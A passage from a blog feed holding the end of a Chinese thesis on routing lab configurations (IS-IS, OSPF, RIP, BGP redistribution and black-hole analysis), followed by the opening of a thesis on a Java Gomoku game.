ID，所有互联接口开启IS-IS功能。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#在AR1、AR2、AR3、AR4上配置如下。</span><span class="token namespace">[AR1]</span>IS<span class="token operator">-IS</span><span class="token namespace">[AR1-IS-IS-1]</span>network<span class="token operator">-</span>entity 49<span class="token punctuation">.</span>0001<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0001<span class="token punctuation">.</span>00<span class="token namespace">[AR1]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>1<span class="token namespace">[AR1-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR1]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>2<span class="token namespace">[AR1-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR1]</span>interface LoopBack 0<span class="token namespace">[AR1-LoopBack0]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR2]</span>IS<span class="token operator">-IS</span><span class="token namespace">[AR2-IS-IS-1]</span>network<span class="token operator">-</span>entity 49<span class="token punctuation">.</span>0001<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0002<span class="token punctuation">.</span>00<span class="token namespace">[AR2]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>1<span class="token namespace">[AR2-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR2]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>0<span class="token namespace">[AR2-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR2]</span>interface LoopBack 0<span class="token namespace">[AR2-LoopBack0]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR3]</span>IS<span class="token operator">-IS</span><span class="token namespace">[AR3-IS-IS-1]</span>network<span class="token operator">-</span>entity 49<span class="token punctuation">.</span>0001<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0003<span class="token punctuation">.</span>00<span class="token namespace">[AR3]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>1<span class="token namespace">[AR3-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR3]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>2<span class="token namespace">[AR3-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR3]</span>interface LoopBack 0<span class="token namespace">[AR1-LoopBack0]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR4]</span>IS<span class="token operator">-IS</span><span class="token namespace">[AR4-IS-IS-1]</span>network<span class="token operator">-</span>entity 49<span class="token punctuation">.</span>0001<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0004<span class="token punctuation">.</span>00<span class="token namespace">[AR4]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>1<span class="token namespace">[AR4-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR4]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>2<span class="token namespace">[AR4-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR4]</span>interface LoopBack 0<span class="token namespace">[AR4-LoopBack0]</span>IS<span class="token operator">-IS</span> enable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>AR5、AR6、AR7配置OSPF，Router ID为环回接口0的IP地址，AR6的GigabitEthernet 0/0/0接口与AR7的GigabitEthernet 0/0/2接口运行在区域0中，AR6的GigabitEthernet 0/0/1接口与AR5的GigabitEthernet 0/0/1接口运行在区域1中，AR7的GigabitEthernet 0/0/1接口与AR5的GigabitEthernet 0/0/0接口运行在区域2中，AR7的GigabitEthernet 0/0/0接口与AR5的GigabitEthernet 0/0/2接口运行在区域4中。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#在AR5、AR6、AR7配置命令如下。</span><span class="token namespace">[AR5]</span>ospf 1<span class="token namespace">[AR5-ospf-1]</span>area 1<span class="token namespace">[AR5-ospf-1-area-0.0.0.1]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>5<span class="token punctuation">.</span>5 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR5-ospf-1-area-0.0.0.1]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>56<span class="token punctuation">.</span>5 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR5-ospf-1-area-0.0.0.1]</span>quit<span class="token namespace">[AR5-ospf-1]</span>area 2<span class="token namespace">[AR5-ospf-1-area-0.0.0.2]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>57<span class="token punctuation">.</span>5 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR5-ospf-1-area-0.0.0.2]</span>quit<span class="token namespace">[AR5-ospf-1]</span>area 4<span class="token namespace">[AR5-ospf-1-area-0.0.0.4]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>10<span class="token punctuation">.</span>5 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR6-ospf-1]</span>area 0<span class="token namespace">[AR6-ospf-1-area-0.0.0.0]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>6<span class="token punctuation">.</span>6 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR6-ospf-1-area-0.0.0.0]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>67<span class="token punctuation">.</span>6 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR6-ospf-1-area-0.0.0.0]</span>quit<span class="token namespace">[AR6-ospf-1]</span>area 1<span class="token namespace">[AR6-ospf-1-area-0.0.0.1]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>56<span class="token punctuation">.</span>6 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR7-ospf-1]</span>area 0<span class="token namespace">[AR7-ospf-1-area-0.0.0.0]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>67<span class="token punctuation">.</span>7 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR7-ospf-1-area-0.0.0.0]</span>quit<span class="token namespace">[AR7-ospf-1]</span>area 2<span class="token namespace">[AR7-ospf-1-area-0.0.0.2]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7<span class="token punctuation">.</span>7 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR7-ospf-1-area-0.0.0.2]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>57<span class="token punctuation">.</span>7 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR7-ospf-1-area-0.0.0.2]</span>quit<span class="token namespace">[AR7-ospf-1]</span>area 4<span class="token namespace">[AR7-ospf-1-area-0.0.0.4]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>10<span class="token punctuation">.</span>7 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在AR8、AR9、AR10配置RIP协议，为了节省链路带宽，在非相关端口不发送接收RIP报文</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#在AR8、AR9、AR10配置命令如下</span><span class="token namespace">[AR8]</span>rip 1<span class="token namespace">[AR8-rip-1]</span>network 10<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR8]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>2<span class="token namespace">[AR8-GigabitEthernet0/0/2]</span>undo rip output<span class="token namespace">[AR8-GigabitEthernet0/0/2]</span>undo rip input<span class="token namespace">[AR9]</span>rip 1<span class="token namespace">[AR9-rip-1]</span>network 10<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR9]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>1<span class="token namespace">[AR9-GigabitEthernet0/0/1]</span>undo rip output<span class="token namespace">[AR9-GigabitEthernet0/0/1]</span>undo rip input<span class="token namespace">[AR10]</span>rip 1<span class="token namespace">[AR10-rip-1]</span>network 10<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR10]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>0<span class="token namespace">[AR10-GigabitEthernet0/0/0]</span>undo rip output<span class="token namespace">[AR10-GigabitEthernet0/0/0]</span>undo rip input<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>AR1与AR3建立IBGP邻居，AR1与AR6建立EBGP邻居，AR3与AR10建立EBGP邻居。在AR6上BGP与OSPF互相引入，在AR10上BGP与IS-IS互相引入，在AR1与AR3上将BGP引入IS-IS中。</p></blockquote><p>在AR1、AR3、AR6、AR10上配置命令如下。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[AR1]</span>bgp 100<span class="token namespace">[AR1-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3<span class="token punctuation">.</span>3 as<span class="token operator">-</span>number 100<span class="token namespace">[AR1-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3<span class="token punctuation">.</span>3 <span class="token function">connect-interface</span> LoopBack0<span class="token namespace">[AR1-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3<span class="token punctuation">.</span>3 next<span class="token operator">-</span>hop<span class="token operator">-</span>local<span class="token namespace">[AR1-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>16<span class="token punctuation">.</span>6 as<span class="token operator">-</span>number 10<span class="token namespace">[AR1]</span>IS<span class="token operator">-IS</span> 1<span class="token namespace">[AR1-IS-IS-1]</span><span class="token function">import-route</span> bgp<span class="token namespace">[AR3]</span>bgp 100<span class="token namespace">[AR3-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 as<span class="token operator">-</span>number 100<span class="token namespace">[AR3-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 <span class="token function">connect-interface</span> LoopBack0<span class="token namespace">[AR3-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 next<span class="token operator">-</span>hop<span class="token operator">-</span>local<span class="token namespace">[AR3-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>103<span class="token punctuation">.</span>10 as<span class="token operator">-</span>number 20<span class="token namespace">[AR3]</span>IS<span class="token operator">-IS</span> 1<span class="token namespace">[AR3-IS-IS-1]</span><span class="token function">import-route</span> bgp<span class="token namespace">[AR6]</span>bgp 10<span class="token namespace">[AR6-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>16<span class="token punctuation">.</span>1 as<span class="token operator">-</span>number 100<span class="token namespace">[AR6-bgp]</span><span class="token function">import-route</span> ospf<span class="token namespace">[AR6]</span>ospf 1<span class="token namespace">[AR6-ospf-1]</span><span class="token function">import-route</span> bgp<span class="token namespace">[AR10]</span>bgp 20<span class="token namespace">[AR10-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>103<span class="token punctuation">.</span>3 as<span class="token operator">-</span>number 100<span class="token namespace">[AR10-bgp]</span><span class="token function">import-route</span> ospf<span class="token namespace">[AR10]</span>ospf 1<span class="token namespace">[AR10-ospf-1]</span><span class="token function">import-route</span> bgp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-5-工程分析">4.5 工程分析</h4><p>首先，分析该工程二层环境下MSTP的防环机制。在SW1上G 0/0/2被选举为指定端口，G 0/0/3被选举为根端口，如图4-1所示。在SW2上G 0/0/2被选举为备份端口，G 0/0/3被选举为根端口，如图4-2所示。在SW3上G 0/0/1与G 0/0/2被选举为指定端口，如图4-3所示。流量在二层网络环境中，会由SW3传给SW1传给R7，或由SW3传给SW2传给R5，在二层环境下不存在环路。</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\SW1端口情况.jpg" style="zoom:80%;" /><center>图4-1 SW1端口情况</center><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\SW2端口情况.jpg" style="zoom:80%;" /><center>图4-2 SW2端口情况</center><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\SW3端口情况.jpg" style="zoom:80%;" /><center>图4-3 SW3端口情况</center><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\AR8部分路由表.jpg" style="zoom: 80%;" /><center>图4-4 AR8部分路由表</center><p>接下来，分析流量的走向问题。PC1、PC2与PC3、PC4可以互相访问，Client2可以访问Server1服务器。先分析路由的传递过程，AR7上有APC1的路由信息，通过同步OSPF的LSDB将路由信息传递给AR5与AR6。AR6与AR1建立了EBGP邻居，并且OSPF被引入到BGP中，AR1会收到AR6通过EBGP邻居传递给他的关于PC1的路由信息。AR1收到后会传递给他的IBGP邻居AR3，AR3与AR10建立EBGP邻居，且去往这些BGP路由的下一跳地址可达（在配置中AR3由AR1收到的BGP路由下一跳为AR1的环回接口），BGP同步关闭，AR3会将这些BGP路由传递给AR10，在AR10上，BGP被引入到RIP中， AR8会收到关于PC1网段的路由信息，如图4-4所示。</p><p>另一方向AR8上拥有PC3的IP地址路由信息，通过RIP协议，同步给AR10、AR9。AR10与AR3建立BGP邻居，并且RIP路由信息被引入到BGP中，所以AR10会将关于PC3的路由信息传递给AR3，AR3收到后会传递给他的IBGP邻居AR1，AR1与AR6建立EBGP邻居，且去往这些BGP路由的下一跳地址可达（在配置中AR1由AR3收到的BGP路由下一跳为AR3的环回接口），BGP同步关闭， AR1会将这些BGP路由传递给AR6，AR6上BGP被引入到OSPF中， AR5、AR7可以收到关于PC3的路由信息，如图4-5所示。</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\AR7部分路由表.jpg" style="zoom:80%;" /><center>图4-5 AR7部分路由表</center><p>在运营商网络环境中，当AR3从他的IBGP邻居收到路由信息后，首先判断去往这条路由的下一跳是否可达，在判断BGP是否同步，如果满足两项要求，路由器才会将路由信息传递给他的EBGP邻居，在工程环境中，运营商与公司之间不会建立任何IGP邻居，AR3收到的路由条目下一跳不可达，需将它的下一跳修改为AR1的环回接口，来保证下一条可达。BGP同步是指BGP收到的路由在他的IGP路由表中也要有这条路由，路由器才会将路由传递。需将BGP路由引入到IS-IS中，这样保证了BGP同步。但是，运营商网络不需要接收公司的路由，如果我们将所有BGP路由全部引入到IGP中，运营商会接收到大量的不需要的路由，IGP的承载能力有限，有可能会导致网络的崩溃。在搭建的网络环境中，可以选择将BGP同步关闭。来将路由传递过去，有可能会导致数据的黑洞。可以使用反射器和联盟技术，将涉及的路由器全互联，消除数据黑洞。</p><h4 id="4-6-工程优化">4.6 工程优化</h4><p>本工程中，运营商要求在内部网络内，只有AR3与AR1建立BGP邻居，其他路由器不建立任何BGP邻居。因为BGP同步的原因，需要在AR3与AR1上将BGP路由引入到IS-IS内，来解决出现的数据黑洞问题。这样又导致了运营商内部IS-IS网络接收到了大量自己并不需要的路由，IS-IS承载路由能力有限，如果有多家公司采用这种方式，有可能会导致网络的崩溃。</p><p>首先，分析数据黑洞产生的原因。如果关闭路由器BGP同步功能，在AR1与AR3上不将BGP路由引入到IS-IS中。当AR3收到去往PC1（10.1.10.0网段）的数据包时候，为了保证下一跳可达，AR1与AR3相互通告的路由信息下一跳地址都为自己环回接口，当AR3查询路由表时，去往10.1.10.0网段下一跳为10.1.1.1（AR1环回接口），出接口为Gigabit Ethernet 0/0/1与Gigabit Ethernet 0/0/2接口，如图4-6所示。数据包会交给AR2或者AR4，AR2与AR4不参与BGP，在AR2与AR4路由表中没有关于10.1.10.0网段的信息，如图4-7所示，数据包会被丢弃，由此导致了数据黑洞的产生。</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\AR3部分路由表.jpg" style="zoom:80%;" /><center>图4-6 AR3部分路由表</center><p>如果解决在AR2与AR4上路由的问题，在AR2与AR4接收到AR3发往10.1.10.0网段的数据包时，会将此数据包交给AR1，则问题解决。在MPLS VPN技术中，MPLS BGP与LDP会给数据流量分配内层外层标签。如果将此技术引用到IS-IS中，IS-IS支持TLV字段，定义IS-IS中TLV字段，在TLV中写入外层目的地址，当路由器收到数据包时，首先查看外层IP地址，如果在路由表中，有关于外层目的地址的路由信息，则将数据包传递，如果在路由表中没有关于外层目的地址信息，在查看内部IP地址转发。当路由器收到TLV字段中外层目的IP地址为本路由器上某接口IP地址时，直接查看内部IP地址进行转发。</p><p>在IS-IS内通过命令引入路由信息时，定义一类路由信息，此类路由信息引入到IS-IS中后，可以配置此类路由信息的外层IP地址，此类路由信息也不会向其他IS-IS邻居传递此类路由。通过外层目的IP地址将数据包交给网络中了解内层目的IP地址的路由器，沿途路由器只需要拥有去往外层目的IP地址的路由信息，不需要关心内部目的IP地址。避免网络中路由器资源的浪费，缩减网络中路由器路由表。当然如果采用这种设计，需要要求所有路由器都要识别此TLV字段，如果中途路由器不识别，也有可能产生路由黑洞。</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\AR2路由表.jpg" alt="img" style="zoom:80%;" /><center>图4-7 AR2路由表</center><p>在此工程中，使用此TLV字段，在AR3上将BGP引入到IS-IS中，定义引入的路由，这些路由不会传递给AR3其他IS-IS邻居，在数据包传递中，加入相应TLV字段，写入外层目的IP地址为10.1.1.1，AR2或AR4收到数据包，根据外层目的IP地址，查询自己路由表，将此数据包交给AR1，消除了路由黑洞，也保证了网络中不会接收到不需要的路由信息。</p><h3 id="5-总结">5 总结</h3><p>本文介绍了现有网络环境中主要通讯设备与设备之间运行的协议，并利用各种网络协议实现了高效的网络互联。从工程实施和分析过程中可以看出，STP技术通常应用在网络的二层环境，用来防止网络风暴。同时，也分析了OSPF与IS-IS邻居建立机制，部署OSPF为企业业务网络提供连通性，并采用BGP在不同机构间传递路由表，降低了路由表规模，增强了网络的可靠性，提升了网络的利用率。仿真实验和工程分析表明，本文采用的技术是合理的和有效的。网络规模的扩大化对网络互联设备与网络协议的要求越来越高，技术与信息的发展，都会对现有网络互联结构产生冲击，作为良好的网络工程设计，需要深入了解现有网络设备，更深层次的实施现有网络协议，避免数据风暴路由、路由黑洞和路由环路的产生，并提升网络资源的利用率。也需要考虑到未来的发展趋势，为工程实施留足未来弹性，从而全面推动网络技术的向前发展。</p><h3 id="参考文献">参考文献</h3><p>[1] 别碧勇. IS-IS路由协议及其在IP网络工程设计中的应用[J]．铁道勘测与设计, 2006(1):47-53.</p><p>[2] 汪孝宜，刘中兵．MVC技术在ASP.NET中的应用[J]．计算机应用，2012，23(6)：212-215．</p><p>[3] 李妍星．DNS安全扩展与可扩展分布式DNS研究[D]．四川：电子科技大学，2022：51-62．</p><p>[4] 章全．计算机网络原理与应用[M] ．南京：南京大学出版社，2019：135-164．</p><p>[5] 严斌宇, 卢苇, 黄锐. OSPF路由选择协议的研究[J]. 四川大学学报自然科学版, 2002, 39(3):460-464.</p><p>[6] 邵兵, 李越鹏, 赵保华. OSPF协议性能测试的研究与实践[J]. 计算机应用, 2003, 23(10): 62-63.</p><p>[7] 吕俏, 刘启文, 石冰心. STP协议原理的算法与实现[J]. 华中科技大学学报自然科学版, 2000, 28(1): 65-67.</p><p>[8] 袁展. 基于Boson NetSim的小型网络虚拟实现[J]. 现代电子技术, 2007, 30(7):89-91.</p><p>[9] 王震宇, 马晓军, 蒋烈辉. STP协议与生成树设计优化[J]. 信息工程大学学报, 2003, 4(1): 66-68.</p><p>[10] 魏立津, 左丞. 基于IS-IS协议的大型IP网络路由规划与设计分析[J]. 硅谷, 2014(6): 50-51.</p><p>[11] 陈杰. 电力通信数据网IGP协议弃OSPF选IS-IS原因分析[J]. 信息通信, 2016(6) :169-170.</p><p>[12] B.Fortz,M.Thorup. Robust Optimization of OSPF/IS-IS Weights[J].Statistics in Medicine,2014,27(22):4515-31.</p><p>[14] A. Cianfrani, V. Eramo, M. Listanti, et al. An Energy Saving Routing Algorithm for a Green OSPF Protocol[C]. IEEE International Conference on Computer Communications (INFOCOM), 2015:1-5.</p><p>[15] J. Rodríguez, S. Fernandez, I. Sanz, et al. Distributed Approach for Smart Grids  Reconfiguration Based on the OSPF Routing Protocol[J]. IEEE Transactions on Industrial   Informatics, 2016, 12(2):864-871.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;网络互联技术的研究与应用&quot;&gt;网络互联技术的研究与应用&lt;/h2&gt;
&lt;p&gt;**摘要：**目前的网络技术以高性能化、高传输效率和高品质的网络服务质量为目标，但现网中仍存在诸多亟需解决的问题。本文首先分析交换网络中涉及的问题，详细比较OSPF协议与IS-IS协议的特征和应</summary>
      
    
    
    
    <category term="项目设计" scheme="https://shierjinghuang.github.io/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="毕业论文" scheme="https://shierjinghuang.github.io/tags/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/"/>
    
    <category term="MSTP" scheme="https://shierjinghuang.github.io/tags/MSTP/"/>
    
    <category term="OSPF" scheme="https://shierjinghuang.github.io/tags/OSPF/"/>
    
    <category term="IS-IS" scheme="https://shierjinghuang.github.io/tags/IS-IS/"/>
    
  </entry>
  
  <entry>
    <title>基于Java语言的五子棋游戏</title>
    <link href="https://shierjinghuang.github.io/2024/05/05/%E5%9F%BA%E4%BA%8EJava%E8%AF%AD%E8%A8%80%E7%9A%84%E4%BA%94%E5%AD%90%E6%A3%8B%E6%B8%B8%E6%88%8F/"/>
    <id>https://shierjinghuang.github.io/2024/05/05/%E5%9F%BA%E4%BA%8EJava%E8%AF%AD%E8%A8%80%E7%9A%84%E4%BA%94%E5%AD%90%E6%A3%8B%E6%B8%B8%E6%88%8F/</id>
    <published>2024-05-05T14:28:22.000Z</published>
    <updated>2025-04-05T14:45:25.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基于java语言的五子棋游戏">基于Java语言的五子棋游戏</h2><p><strong>摘要</strong>：五子棋作为起源于中国的古老游戏，兼顾老少皆宜与增强思维能力的优点，是一种需要两方参与的纯策略型棋类游戏。游戏规则大致为双方各执一色棋子，在空棋盘开局下，由持黑子方先下，随后黑白交替，每次只能下一子，首先一方形成五个相同颜色棋子连线即可获胜。论文将五子棋游戏与JAVA语言相结合，通过IntelliJ IDEA Community Edition开发工具，制作出了可以在计算机上进行游玩的五子棋游戏系统。该系统将游戏细分为棋盘、落子规则、胜负判定等多个模块，并且支持双人、人机游玩模式。该游戏系统界面简洁明了，方便操作。论文的最后讨论了系统还可有改进优化的空间。</p><p><strong>关键词</strong>：五子棋 JAVA 规则判定 双人游戏</p><h3 id="引言">引言</h3><p>五子棋作为需要两人参与的对弈棋类游戏，自中国古代起，就深受全国男女老少的喜爱。五子棋棋子一般分为黑与白两色，游戏双方各执一种颜色的棋子，由黑方先下一子，随后是白方下一子，双方轮流交错，直到有一方首先达成自己的棋子有五颗在同一条连线上，则宣布游戏结束，首先达成条件的人为胜利的一方。</p><p>作者综合考虑五子棋游戏特性以及当下比较流行的几大编程语言的特点，决定使用JAVA语言来开发五子棋游戏。Java不仅可以用于游戏开发，而且在游戏开发领域拥有广泛的应用^[1]^。该语言功能强大、安全稳定，拥有大量并且类型丰富的类库。除此之外，还使用了IntelliJ IDEA Community Edition工具，该工具是个集成开发工具，有多种功能，可以对代码进行编译、编辑和调试，是一款功能很强大的集成开发环境，而且IDEA同JAVA一样，能够跨平台工作，使得五子棋游戏能够在多种操作系统上运行。使用JAVA语言与IDEA，使游戏里的规则实现可以轻松方便地执行。最终实现的五子棋系统稳定可靠，功能齐全。</p><p>该系统的实现，使得玩家摆脱了实体游戏道具的束缚，可以随时随地在多种操作系统上进行游玩。除此之外，作者在游戏里开发的人机模式，利用了属于人工智能的人机博弈^[2]^。作为人工智能领域的重要分支，人机博弈一直是人们进行科研探索的热门方向，应用领域十分广泛^[3]^。人机对战模式降低了游戏人数的要求，使得一个人也可以体验到五子棋游戏的乐趣。</p><h3 id="1-绪论">1 绪论</h3><h4 id="1-1-研发背景">1.1 研发背景</h4><p>五子棋，作为中国古代就存在的古老游戏，其历史可以追溯数千年前，比如在《三国演义》中就有关五子棋里“连珠”的描述，至今已经成为了体系丰富完整的中国文化，甚至已经成为世界性的棋类游戏，特别在东南亚地区深受喜爱。比如在韩国，人们将五子棋爱称为“情侣棋”，意为情侣之间下五子棋有利于增进感情。在日本，因为众多的中老年群体对五子棋的喜爱，所以将五子棋称为“中老年棋”。而西方人将五子棋称为“绅士棋”，意为下五子棋可以展示出绅士的风度。时至今日，五子棋作为独特的棋类玩法，已经形成了丰富多彩的体系文化，它已经从单纯的娱乐项目，演变出了国际性的竞技运动。世界各国都建有有关五子棋的协议与赛事活动，各国人民积极参与。</p><p>五子棋作为一款经典的可休闲娱乐，也可竞技比赛的棋类游戏，也因其简单易懂的游戏规则，已经成为了一种文化符号，将长久地活跃在人们的生活里。</p><h4 id="1-2-研发意义">1.2 研发意义</h4><p>之所以选择五子棋游戏在计算机上的开发，是因为具有很深远的意义。首先五子棋中国古代就存在的古老游戏，将其通过互联网传播，会让世界上更多的人，从五子棋文化的角度来接触中华文明，而且以计算机为载体，将五子棋游戏数据化保存在网络中，也是一种新的文化遗产留存保护形式，为古老的文化遗产增添新的传承方式。而且通过互联网这一传播途经，更容易将五子棋文化推广给年青一代的互联网网民。</p><p>设计五子棋系统，还可以为人们提供一种娱乐方式。无论是在公共场合，办公室还是在家中，人们都可以在不用五子棋道具的情况下，摆脱一定环境与道具的束缚，随时随地通过计算机就可以轻松体会到五子棋带来的乐趣。并且用计算机完五子棋，拥有现实中玩五子棋无法做到的优点，就是可在只有一个玩家的情况下，用计算机来陪同下棋，从而降低了五子棋的游玩门槛。</p><p>众所周知，五子棋是一款益智的棋类游戏，通过在五子棋中对弈，能够促进玩家的思维能力，逻辑推理能力和决策能，从而达到锻炼玩家智力的效果。而对于研发五子棋游戏的人来说，编译这款游戏可以起到编程语言练手的作用，可以帮助编译者熟练掌握计算机语言编程的技巧与方法。比如在研究五子棋算法时，能够提升研发人计算机语言的理解和计算机语言的实际应用能力。</p><p>最后，研发五子棋游戏，可以称为一个研发创新的起点。通过不断地研究创新，为五子棋游戏系统增添新的功能，优化游戏算法，美化游戏界面，像这样的不断地完善升级游戏内容，从而提升玩家游戏体验。</p><h4 id="1-3-研发内容">1.3 研发内容</h4><p>该系统的实现目标是将五子棋的基本功能完整地体现在五子棋系统中，这里面会包括很多技术与功能。</p><p>首先是在游戏开始前的界面上，界面整体设计需要简洁明了，能让玩家一眼看出界面上各选择按钮的功能，颜色搭配上需要柔和不伤眼睛。其次要有基本的功能选择，例如双人对战，还要有具有五子棋系统特色的人机对战，即在一个人的时候也可以在计算机作为陪同对手的情况下游玩。</p><p>对于游戏内的设定，首先要有基本的胜负判断功能，合法落子功能，和棋盘绘制功能。根据五子棋的游戏规则，胜负的判定是五子连珠^[4]^的判定，即一方首先达成在一条方向线上，实现五颗本方颜色棋子连续，其中方向线是指水平方向、竖直方向以及斜方向。合法落子是指新落下的棋子位置上，不能存在其他棋子，即棋子只能放在空的落棋点上。对棋盘绘制功能的要求是，棋盘要有基本的15道盘规格，对棋盘棋子风格的绘制要明了柔和。玩家在选择人机对战时，电脑下棋算法要具有推算最优落子位置功能。此外，五子棋系统除了需要拥有基本的开始，结束功能，还有具备满足玩家基本需求的悔棋、认输功能。还有一些比较人性化的功能，比如界面提醒，提示玩家轮到哪一方落子。由于玩家一般需要通过鼠标来进行游戏操作，所以还要引入鼠标事件技术。</p><p>最后还要实现判断五子棋游戏结束条件，除了上文提到的胜负判定，还有棋满平局提醒。</p><h3 